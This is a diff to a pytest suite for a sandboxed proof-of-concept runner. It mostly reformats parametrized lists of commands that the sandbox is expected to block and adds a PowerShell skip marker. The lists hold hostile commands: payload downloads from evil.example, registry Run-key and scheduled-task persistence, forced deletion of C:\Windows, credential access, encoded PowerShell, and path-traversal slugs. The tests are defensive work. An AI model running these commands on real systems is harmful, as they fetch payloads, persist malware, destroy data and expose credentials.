@@ -1,11 +1,18 @@
 # tests/runner/test_poc_sandbox.py
 import importlib
+import shutil
 
 import pytest
+
+_requires_powershell = pytest.mark.skipif(
+    shutil.which("powershell") is None,
+    reason="powershell not available on this host",
+)
 
 
 def _fresh(tmp_path, monkeypatch):
     import runner.tools.poc_sandbox as ps
+
     importlib.reload(ps)
     monkeypatch.setattr(ps, "POC_ROOT", tmp_path / "poc")
     monkeypatch.setattr(ps, "LEDGER_DIR", tmp_path / "ledger")
@@ -34,6 +41,7 @@ def _stub_subprocess(ps, monkeypatch):
 
 # ── slug guarding (unchanged behavior) ────────────────────────────────────────
 
+
 def test_rejects_slug_escape(tmp_path, monkeypatch):
     ps = _fresh(tmp_path, monkeypatch)
     res = ps.poc_runner(slug="../evil", command="echo hi")
@@ -42,7 +50,19 @@ def test_rejects_slug_escape(tmp_path, monkeypatch):
 
 @pytest.mark.parametrize(
     "slug",
-    ["../evil", "..\\evil", "/etc/passwd", "a/b", "a\\b", "Upper", "a", "", "x" * 60, "with space", ".hidden"],
+    [
+        "../evil",
+        "..\\evil",
+        "/etc/passwd",
+        "a/b",
+        "a\\b",
+        "Upper",
+        "a",
+        "",
+        "x" * 60,
+        "with space",
+        ".hidden",
+    ],
 )
 def test_rejects_unsafe_slugs(tmp_path, monkeypatch, slug):
     ps = _fresh(tmp_path, monkeypatch)
@@ -51,6 +71,7 @@ def test_rejects_unsafe_slugs(tmp_path, monkeypatch, slug):
     assert not ps.POC_ROOT.exists() or not any(ps.POC_ROOT.iterdir())
 
 
+@_requires_powershell
 def test_runs_in_slug_dir(tmp_path, monkeypatch):
     ps = _fresh(tmp_path, monkeypatch)
     res = ps.poc_runner(slug="demo", command="echo prospector-ok")
@@ -58,6 +79,7 @@ def test_runs_in_slug_dir(tmp_path, monkeypatch):
     assert (ps.POC_ROOT / "demo").exists()
 
 
+@_requires_powershell
 def test_relative_writes_stay_in_slug_dir(tmp_path, monkeypatch):
     ps = _fresh(tmp_path, monkeypatch)
     ps.poc_runner(slug="demo", command="Set-Content -Path out.txt -Value hello")
@@ -71,6 +93,7 @@ def test_forbidden_command_blocked(tmp_path, monkeypatch):
     assert "exit_code" not in res
 
 
+@_requires_powershell
 def test_timeout_kills_command(tmp_path, monkeypatch):
     ps = _fresh(tmp_path, monkeypatch)
     res = ps.poc_runner(slug="demo", command="Start-Sleep -Seconds 10", timeout=2)
@@ -80,24 +103,28 @@ def test_timeout_kills_command(tmp_path, monkeypatch):
 
 # ── network egress block ──────────────────────────────────────────────────────
 
-@pytest.mark.parametrize("command", [
-    "Invoke-WebRequest https://evil.example/x",
-    "Invoke-RestMethod -Uri https://evil.example",
-    "iwr https://evil.example -OutFile x",
-    "irm https://evil.example",
-    "curl https://evil.example",
-    "wget https://evil.example",
-    "Test-NetConnection google.com -Port 443",
-    "tnc google.com -Port 80",
-    "Start-BitsTransfer -Source https://evil.example/p.exe",
-    "(New-Object System.Net.WebClient).DownloadString('https://evil.example')",
-    "(New-Object Net.WebClient).DownloadFile('https://evil.example','x')",
-    "python -c 'import socket; socket.socket()'",
-    "python -c 'import urllib.request'",
-    "python -c 'from urllib import request'",
-    "python -c 'import requests; requests.get(\"https://x\")'",
-    "python -c 'import httpx; httpx.get(\"https://x\")'",
-])
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "Invoke-WebRequest https://evil.example/x",
+        "Invoke-RestMethod -Uri https://evil.example",
+        "iwr https://evil.example -OutFile x",
+        "irm https://evil.example",
+        "curl https://evil.example",
+        "wget https://evil.example",
+        "Test-NetConnection google.com -Port 443",
+        "tnc google.com -Port 80",
+        "Start-BitsTransfer -Source https://evil.example/p.exe",
+        "(New-Object System.Net.WebClient).DownloadString('https://evil.example')",
+        "(New-Object Net.WebClient).DownloadFile('https://evil.example','x')",
+        "python -c 'import socket; socket.socket()'",
+        "python -c 'import urllib.request'",
+        "python -c 'from urllib import request'",
+        "python -c 'import requests; requests.get(\"https://x\")'",
+        "python -c 'import httpx; httpx.get(\"https://x\")'",
+    ],
+)
 def test_network_egress_blocked(tmp_path, monkeypatch, command):
     ps = _fresh(tmp_path, monkeypatch)
     calls = _stub_subprocess(ps, monkeypatch)
@@ -108,26 +135,30 @@ def test_network_egress_blocked(tmp_path, monkeypatch, command):
 
 # ── broadened destructive / privilege filter ──────────────────────────────────
 
-@pytest.mark.parametrize("command", [
-    "Remove-Item -Recurse -Force .\\build",
-    "Remove-Item -Force -Recurse C:\\Windows",   # flag order swapped
-    "del /f /s /q C:\\stuff",
-    "rd /s /q C:\\stuff",
-    "rmdir /s /q C:\\stuff",
-    "reg add HKLM\\Software\\Evil /v Run /d payload",
-    "reg delete HKEY_LOCAL_MACHINE\\Software\\X",
-    "Set-ItemProperty -Path HKLM:\\Software\\X -Name Run -Value p",
-    "New-Item -Path HKLM:\\Software\\Evil",
-    "schtasks /create /tn evil /tr payload.exe /sc onlogon",
-    "Register-ScheduledTask -TaskName evil -Action $a",
-    "taskkill /f /im python.exe",
-    "Stop-Process -Force -Name runner",
-    "Get-Credential",
-    "$s | ConvertFrom-SecureString",
-    "[System.Net.NetworkCredential]::new('u','p')",
-    "powershell -EncodedCommand SQBFAFgA",
-    "powershell -enc QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA",
-])
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "Remove-Item -Recurse -Force .\\build",
+        "Remove-Item -Force -Recurse C:\\Windows",  # flag order swapped
+        "del /f /s /q C:\\stuff",
+        "rd /s /q C:\\stuff",
+        "rmdir /s /q C:\\stuff",
+        "reg add HKLM\\Software\\Evil /v Run /d payload",
+        "reg delete HKEY_LOCAL_MACHINE\\Software\\X",
+        "Set-ItemProperty -Path HKLM:\\Software\\X -Name Run -Value p",
+        "New-Item -Path HKLM:\\Software\\Evil",
+        "schtasks /create /tn evil /tr payload.exe /sc onlogon",
+        "Register-ScheduledTask -TaskName evil -Action $a",
+        "taskkill /f /im python.exe",
+        "Stop-Process -Force -Name runner",
+        "Get-Credential",
+        "$s | ConvertFrom-SecureString",
+        "[System.Net.NetworkCredential]::new('u','p')",
+        "powershell -EncodedCommand SQBFAFgA",
+        "powershell -enc QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA",
+    ],
+)
 def test_destructive_and_privilege_blocked(tmp_path, monkeypatch, command):
     ps = _fresh(tmp_path, monkeypatch)
     calls = _stub_subprocess(ps, monkeypatch)
@@ -154,6 +185,7 @@ def test_benign_commands_not_over_blocked(tmp_path, monkeypatch):
 
 # ── egress env vars on the subprocess ─────────────────────────────────────────
 
+
 def test_egress_env_vars_set_on_subprocess(tmp_path, monkeypatch):
     ps = _fresh(tmp_path, monkeypatch)
     calls = _stub_subprocess(ps, monkeypatch)
@@ -169,6 +201,7 @@ def test_egress_env_vars_set_on_subprocess(tmp_path, monkeypatch):
 
 
 # ── per-PoC dollar meter ──────────────────────────────────────────────────────
+
 
 def test_under_cap_runs_and_charges(tmp_path, monkeypatch):
     ps = _fresh(tmp_path, monkeypatch)
